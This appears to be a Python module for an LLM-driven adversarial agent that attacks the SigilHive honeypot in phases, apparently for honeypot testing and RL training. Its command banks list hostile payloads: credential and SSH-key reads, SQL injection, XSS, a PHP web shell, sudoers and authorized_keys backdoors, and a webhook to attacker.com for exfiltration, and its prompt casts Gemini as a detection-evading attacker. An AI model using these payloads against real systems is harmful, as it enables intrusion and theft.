"""
Adversarial Agent for SigilHive Honeypot System
Uses LangGraph with Google Gemini for intelligent, multi-phase attacks.
Adapts behavior based on honeypot responses and suspicion levels.
Executes REAL attacks against honeypot services (SSH, HTTP, Database).
"""

import json
import logging
import random
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

import google.genai as genai
from langgraph.graph import END, StateGraph
from typing_extensions import TypedDict

from .real_attacks import SSHAttacker, HTTPAttacker, DatabaseAttacker, AttackMetric
from .result_storage import AttackResultStorage

logger = logging.getLogger(__name__)


class AttackPhase(str, Enum):
    RECONNAISSANCE = "reconnaissance"
    EXPLOITATION = "exploitation"
    PERSISTENCE = "persistence"
    EXFILTRATION = "exfiltration"
    CLEANUP = "cleanup"


class Protocol(str, Enum):
    SSH = "ssh"
    HTTP = "http"
    DATABASE = "database"


@dataclass
class AttackResult:
    phase: AttackPhase
    protocol: Protocol
    success: bool
    suspicion_delta: float
    data_extracted: dict[str, Any] = field(default_factory=dict)
    commands_executed: list[str] = field(default_factory=list)
    honeypot_responses: list[str] = field(default_factory=list)
    timestamp: float = field(default_factory=time.time)
    reward_signal: float = 0.0


class AgentState(TypedDict):
    phase: str
    protocol: str
    suspicion_level: float
    attack_history: list[dict]
    current_commands: list[str]
    honeypot_responses: list[str]
    extracted_data: dict[str, Any]
    should_abort: bool
    next_action: str
    gemini_reasoning: str


class AdversarialAgent:
    """
    Intelligent attacker using LangGraph + Google Gemini for strategic decisions.

    Attack lifecycle:
      reconnaissance → exploitation → persistence → exfiltration → cleanup

    Adapts tactics dynamically based on:
      - Honeypot suspicion signals
      - Protocol-specific response patterns
      - Historical attack outcomes
    """

    # Suspicion thresholds
    ABORT_THRESHOLD = 0.85
    CAUTION_THRESHOLD = 0.55
    SAFE_THRESHOLD = 0.25

    def __init__(
        self,
        gemini_api_key: str,
        model_name: str = "gemini-1.5-flash",
        target_host: str = "localhost",
        ssh_port: int = 5555,
        http_port: int = 8080,
        db_port: int = 2225,
    ):
        self.target_host = target_host
        self.ssh_port = ssh_port
        self.http_port = http_port
        self.db_port = db_port
        self.model_name = model_name

        # Configure Gemini with new API
        self.client = genai.Client(api_key=gemini_api_key)

        # Attack state
        self.suspicion_level: float = 0.0
        self.attack_history: list[AttackResult] = []
        self.session_id = f"atk_{int(time.time())}_{random.randint(1000, 9999)}"

        # Build LangGraph workflow
        self.workflow = self._build_workflow()

        logger.info(f"AdversarialAgent initialized | session={self.session_id}")

    # ------------------------------------------------------------------ #
    #  LangGraph workflow construction                                     #
    # ------------------------------------------------------------------ #

    def _build_workflow(self) -> StateGraph:
        graph = StateGraph(AgentState)

        graph.add_node("assess_situation", self._assess_situation)
        graph.add_node("recon_node", self._recon_node)
        graph.add_node("exploit_node", self._exploit_node)
        graph.add_node("persist_node", self._persist_node)
        graph.add_node("exfil_node", self._exfil_node)
        graph.add_node("cleanup_node", self._cleanup_node)
        graph.add_node("abort_node", self._abort_node)

        graph.set_entry_point("assess_situation")

        graph.add_conditional_edges(
            "assess_situation",
            self._route_from_assessment,
            {
                "recon": "recon_node",
                "exploit": "exploit_node",
                "persist": "persist_node",
                "exfil": "exfil_node",
                "cleanup": "cleanup_node",
                "abort": "abort_node",
            },
        )

        for node in ["recon_node", "exploit_node", "persist_node", "exfil_node"]:
            graph.add_edge(node, "assess_situation")
        graph.add_edge("cleanup_node", END)
        graph.add_edge("abort_node", END)

        return graph.compile()

    # ------------------------------------------------------------------ #
    #  Graph nodes                                                         #
    # ------------------------------------------------------------------ #

    def _assess_situation(self, state: AgentState) -> AgentState:
        """Use Gemini to reason about current state and decide next action."""
        if state["suspicion_level"] >= self.ABORT_THRESHOLD:
            state["should_abort"] = True
            state["next_action"] = "abort"
            return state

        prompt = self._build_assessment_prompt(state)
        try:
            response = self.client.models.generate_content(
                model=self.model_name,
                contents=prompt
            )
            reasoning = response.text.strip()
        except Exception as exc:
            logger.warning(f"Gemini call failed: {exc}")
            reasoning = self._fallback_reasoning(state)

        state["gemini_reasoning"] = reasoning
        state["next_action"] = self._parse_next_action(reasoning, state)
        return state

    def _recon_node(self, state: AgentState) -> AgentState:
        success, responses, metrics = self._execute_real_attack(state["protocol"], "recon")
        
        for metric in metrics:
            self.storage.store_attack_result(
                session_id=self.session_id,
                protocol=metric.protocol,
                attack_type=metric.attack_type,
                success=metric.success,
                data_extracted=metric.data_extracted,
                suspicion_level=metric.suspicion_level,
                duration=metric.duration,
                responses=responses,
            )
        
        state["honeypot_responses"].extend(responses)
        state["suspicion_level"] = min(
            1.0, state["suspicion_level"] + (metrics[0].suspicion_level if metrics else 0.03)
        )
        self._record_attack(state, AttackPhase.RECONNAISSANCE, success)
        return state

    def _exploit_node(self, state: AgentState) -> AgentState:
        success, responses, metrics = self._execute_real_attack(state["protocol"], "exploit")
        
        for metric in metrics:
            self.storage.store_attack_result(
                session_id=self.session_id,
                protocol=metric.protocol,
                attack_type=metric.attack_type,
                success=metric.success,
                data_extracted=metric.data_extracted,
                suspicion_level=metric.suspicion_level,
                duration=metric.duration,
                responses=responses,
            )
        
        state["honeypot_responses"].extend(responses)
        state["extracted_data"]["exploit_data"] = responses if success else []
        state["suspicion_level"] = min(
            1.0, state["suspicion_level"] + (metrics[0].suspicion_level if metrics else 0.12)
        )
        self._record_attack(state, AttackPhase.EXPLOITATION, success)
        return state

    def _persist_node(self, state: AgentState) -> AgentState:
        success, responses, metrics = self._execute_real_attack(state["protocol"], "persist")
        
        for metric in metrics:
            self.storage.store_attack_result(
                session_id=self.session_id,
                protocol=metric.protocol,
                attack_type=metric.attack_type,
                success=metric.success,
                data_extracted=metric.data_extracted,
                suspicion_level=metric.suspicion_level,
                duration=metric.duration,
                responses=responses,
            )
        
        state["honeypot_responses"].extend(responses)
        state["suspicion_level"] = min(
            1.0, state["suspicion_level"] + (metrics[0].suspicion_level if metrics else 0.15)
        )
        self._record_attack(state, AttackPhase.PERSISTENCE, success)
        return state

    def _exfil_node(self, state: AgentState) -> AgentState:
        success, responses, metrics = self._execute_real_attack(state["protocol"], "exfil")
        
        for metric in metrics:
            self.storage.store_attack_result(
                session_id=self.session_id,
                protocol=metric.protocol,
                attack_type=metric.attack_type,
                success=metric.success,
                data_extracted=metric.data_extracted,
                suspicion_level=metric.suspicion_level,
                duration=metric.duration,
                responses=responses,
            )
        
        state["extracted_data"]["exfil_data"] = responses if success else []
        state["suspicion_level"] = min(
            1.0, state["suspicion_level"] + (metrics[0].suspicion_level if metrics else 0.18)
        )
        self._record_attack(state, AttackPhase.EXFILTRATION, success)
        return state

    def _cleanup_node(self, state: AgentState) -> AgentState:
        logger.info(f"[{self.session_id}] Cleanup complete. Suspicion={state['suspicion_level']:.2f}")
        return state

    def _abort_node(self, state: AgentState) -> AgentState:
        logger.warning(
            f"[{self.session_id}] ABORT triggered. Suspicion={state['suspicion_level']:.2f}"
        )
        return state

    # ------------------------------------------------------------------ #
    #  Routing logic                                                       #
    # ------------------------------------------------------------------ #

    def _route_from_assessment(self, state: AgentState) -> str:
        if state.get("should_abort"):
            return "abort"
        return state.get("next_action", "recon")

    def _parse_next_action(self, reasoning: str, state: AgentState) -> str:
        text = reasoning.lower()
        phase_history = [r.get("phase", "") for r in state["attack_history"]]

        if "abort" in text or "retreat" in text:
            return "abort"
        if "exfil" in text and AttackPhase.EXPLOITATION in phase_history:
            return "exfil"
        if "persist" in text and AttackPhase.EXPLOITATION in phase_history:
            return "persist"
        if "exploit" in text and AttackPhase.RECONNAISSANCE in phase_history:
            return "exploit"
        if "cleanup" in text:
            return "cleanup"

        # Default progression
        if not phase_history:
            return "recon"
        last = phase_history[-1] if phase_history else ""
        progression = {
            AttackPhase.RECONNAISSANCE: "exploit",
            AttackPhase.EXPLOITATION: "persist",
            AttackPhase.PERSISTENCE: "exfil",
            AttackPhase.EXFILTRATION: "cleanup",
        }
        return progression.get(last, "recon")

    # ------------------------------------------------------------------ #
    #  Gemini prompt helpers                                               #
    # ------------------------------------------------------------------ #

    def _build_assessment_prompt(self, state: AgentState) -> str:
        recent_responses = state["honeypot_responses"][-3:] if state["honeypot_responses"] else []
        phase_counts = {}
        for r in state["attack_history"]:
            p = r.get("phase", "unknown")
            phase_counts[p] = phase_counts.get(p, 0) + 1

        return f"""You are an advanced penetration tester assessing an attack in progress.

TARGET PROTOCOL: {state['protocol'].upper()}
CURRENT SUSPICION LEVEL: {state['suspicion_level']:.2f} (0=undetected, 1=fully detected)
PHASES COMPLETED: {json.dumps(phase_counts)}
RECENT HONEYPOT RESPONSES: {json.dumps(recent_responses)}
COMMANDS EXECUTED SO FAR: {len(state['current_commands'])}
DATA EXTRACTED: {list(state['extracted_data'].keys())}

Based on this situation, recommend the SINGLE BEST next action from:
- recon (gather more info, low risk)
- exploit (attempt credential/code execution attack)
- persist (establish foothold/backdoor)
- exfil (extract sensitive data)
- cleanup (erase traces and exit gracefully)
- abort (suspicion too high, immediate retreat)

Consider:
1. Suspicion > 0.85 → always abort
2. Suspicion > 0.55 → prefer low-noise actions
3. Only exfil/persist after successful exploitation
4. Cleanup after exfiltration for clean exit

Respond with your recommended action keyword first, then one sentence of reasoning.
Example: "exploit - Reconnaissance complete with low suspicion, time to probe credentials."
"""

    def _fallback_reasoning(self, state: AgentState) -> str:
        """Rule-based fallback when Gemini is unavailable."""
        if state["suspicion_level"] > self.ABORT_THRESHOLD:
            return "abort - suspicion critical"
        phase_history = [r.get("phase", "") for r in state["attack_history"]]
        if not phase_history:
            return "recon - starting fresh attack"
        if AttackPhase.EXPLOITATION not in phase_history:
            return "exploit - recon done, time to attack"
        if AttackPhase.EXFILTRATION not in phase_history:
            return "exfil - foothold established, extract data"
        return "cleanup - mission complete"

    # ------------------------------------------------------------------ #
    #  Protocol-specific command banks                                     #
    # ------------------------------------------------------------------ #

    def _get_recon_commands(self, protocol: str) -> list[str]:
        banks = {
            Protocol.SSH: [
                "uname -a",
                "whoami",
                "id",
                "cat /etc/passwd",
                "ls -la /home",
                "ps aux",
                "netstat -tulpn",
                "cat /etc/hostname",
            ],
            Protocol.HTTP: [
                "GET /robots.txt",
                "GET /.env",
                "GET /admin",
                "GET /api/v1/users",
                "GET /phpinfo.php",
                "GET /wp-admin",
                "OPTIONS /",
                "GET /backup",
            ],
            Protocol.DATABASE: [
                "SHOW DATABASES;",
                "SELECT user, host FROM mysql.user;",
                "SHOW TABLES FROM shophub;",
                "SELECT version();",
                "SHOW VARIABLES LIKE 'datadir';",
            ],
        }
        pool = banks.get(protocol, banks[Protocol.SSH])
        return random.sample(pool, min(3, len(pool)))

    def _get_exploit_commands(self, protocol: str) -> list[str]:
        banks = {
            Protocol.SSH: [
                "sudo -l",
                "cat /etc/sudoers",
                "find / -perm -4000 -type f 2>/dev/null",
                "cat /root/.bash_history",
                "cat ~/.ssh/id_rsa",
                "crontab -l",
            ],
            Protocol.HTTP: [
                "POST /login username=admin&password=admin",
                "GET /api/users?id=1 OR 1=1",
                "POST /upload Content-Type:multipart/form-data",
                "GET /api/admin/users Authorization:Bearer eyJ...",
                "POST /search q=<script>alert(1)</script>",
            ],
            Protocol.DATABASE: [
                "SELECT * FROM shophub.users LIMIT 10;",
                "SELECT * FROM shophub.admin_users;",
                "SELECT email, password_hash FROM shophub.users WHERE id=1;",
                "LOAD DATA INFILE '/etc/passwd' INTO TABLE shophub.users;",
                "SELECT @@global.secure_file_priv;",
            ],
        }
        pool = banks.get(protocol, banks[Protocol.SSH])
        return random.sample(pool, min(2, len(pool)))

    def _get_persistence_commands(self, protocol: str) -> list[str]:
        banks = {
            Protocol.SSH: [
                "echo 'attacker_key' >> ~/.ssh/authorized_keys",
                "crontab -e @reboot /tmp/.backdoor",
                "useradd -m -s /bin/bash sysadmin2",
                "echo 'sysadmin2 ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
            ],
            Protocol.HTTP: [
                "PUT /uploads/shell.php <?php system($_GET['cmd']); ?>",
                "POST /api/admin/users {role:admin,email:attacker@evil.com}",
                "POST /api/webhooks url=http://attacker.com/exfil",
            ],
            Protocol.DATABASE: [
                "CREATE USER 'backup_admin'@'%' IDENTIFIED BY 'P@ssw0rd!';",
                "GRANT ALL PRIVILEGES ON *.* TO 'backup_admin'@'%';",
                "CREATE TRIGGER log_all AFTER INSERT ON shophub.orders FOR EACH ROW ...",
            ],
        }
        pool = banks.get(protocol, banks[Protocol.SSH])
        return random.sample(pool, min(2, len(pool)))

    # ------------------------------------------------------------------ #
    #  Simulation helpers                                                  #
    # ------------------------------------------------------------------ #

    def _execute_real_attack(
        self, protocol: str, attack_type: str
    ) -> tuple[bool, list[str], list[AttackMetric]]:
        """Execute real attacks against the honeypot services."""
        try:
            if protocol == Protocol.SSH:
                if attack_type == "recon":
                    return self.ssh_attacker.attack_recon()
                elif attack_type == "exploit":
                    return self.ssh_attacker.attack_exploit()
                else:
                    return False, [], []
            
            elif protocol == Protocol.HTTP:
                if attack_type == "recon":
                    return self.http_attacker.attack_recon()
                elif attack_type == "exploit":
                    return self.http_attacker.attack_exploit()
                else:
                    return False, [], []
            
            elif protocol == Protocol.DATABASE:
                if attack_type == "recon":
                    return self.db_attacker.attack_recon()
                elif attack_type == "exploit":
                    return self.db_attacker.attack_exploit()
                else:
                    return False, [], []
        
        except Exception as e:
            logger.warning(f"Real attack failed: {e}")
        
        return False, [], []
    
    def _simulate_honeypot_responses(
        self, commands: list[str], protocol: str, phase: str
    ) -> list[str]:
        """Fallback simulation (deprecated - use real attacks)."""
        templates = {
            "recon": ["[Real attack attempted]"],
            "exploit": ["[Real attack attempted]"],
            "persist": ["[Real attack attempted]"],
        }
        pool = templates.get(phase, templates["recon"])
        return [random.choice(pool) for _ in commands]

    def _simulate_data_exfiltration(self, protocol: str) -> dict[str, Any]:
        """Simulate extracted data per protocol."""
        data_map = {
            Protocol.SSH: {
                "ssh_keys": ["ssh-rsa AAAA...shophub-prod"],
                "config_files": ["/etc/nginx/nginx.conf", "/var/www/.env"],
                "credentials": {"db_host": "localhost", "db_pass": "REDACTED"},
            },
            Protocol.HTTP: {
                "api_tokens": ["eyJhbGciOiJIUzI1NiJ9..."],
                "user_emails": ["admin@shophub.com", "ops@shophub.com"],
                "session_cookies": ["PHPSESSID=abc123..."],
            },
            Protocol.DATABASE: {
                "user_count": random.randint(1000, 50000),
                "admin_hashes": ["$2b$12$..."],
                "payment_records": random.randint(100, 5000),
                "schema_dump": ["users", "orders", "payments", "admin_users"],
            },
        }
        return data_map.get(protocol, {})

    def _estimate_suspicion_delta(self, commands: list[str], phase: str) -> float:
        """Estimate how much suspicion a set of commands adds."""
        base = {"recon": 0.03, "exploit": 0.12, "persist": 0.08, "exfil": 0.15}
        return base.get(phase, 0.05) * len(commands) * random.uniform(0.8, 1.2)

    def _record_attack(self, state: AgentState, phase: AttackPhase, success: bool = False) -> None:
        state["attack_history"].append(
            {
                "phase": phase,
                "protocol": state["protocol"],
                "suspicion": state["suspicion_level"],
                "timestamp": time.time(),
                "success": success,
            }
        )

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def run_attack(
        self,
        protocol: Protocol = Protocol.SSH,
        max_steps: int = 10,
    ) -> list[AttackResult]:
        """Execute a full attack campaign against the target protocol."""
        logger.info(f"[{self.session_id}] Starting {protocol.value} attack")

        initial_state: AgentState = {
            "phase": AttackPhase.RECONNAISSANCE,
            "protocol": protocol,
            "suspicion_level": self.suspicion_level,
            "attack_history": [],
            "current_commands": [],
            "honeypot_responses": [],
            "extracted_data": {},
            "should_abort": False,
            "next_action": "recon",
            "gemini_reasoning": "",
        }

        final_state = self.workflow.invoke(initial_state)

        # Convert history to AttackResult objects
        results = []
        for entry in final_state.get("attack_history", []):
            results.append(
                AttackResult(
                    phase=entry["phase"],
                    protocol=protocol,
                    success=final_state["suspicion_level"] < self.ABORT_THRESHOLD,
                    suspicion_delta=entry["suspicion"],
                    data_extracted=final_state.get("extracted_data", {}),
                    commands_executed=final_state.get("current_commands", []),
                    honeypot_responses=final_state.get("honeypot_responses", []),
                    reward_signal=self._calculate_reward(final_state),
                )
            )

        self.suspicion_level = final_state["suspicion_level"]
        self.attack_history.extend(results)
        return results

    def _calculate_reward(self, state: AgentState) -> float:
        """Reward signal for RL training feedback."""
        base = len(state.get("extracted_data", {})) * 10.0
        penalty = state["suspicion_level"] * 50.0
        phases_bonus = len(set(r["phase"] for r in state["attack_history"])) * 5.0
        return base + phases_bonus - penalty

    def reset_session(self) -> None:
        self.suspicion_level = 0.0
        self.attack_history.clear()
        self.session_id = f"atk_{int(time.time())}_{random.randint(1000, 9999)}"
        logger.info(f"Session reset. New session: {self.session_id}")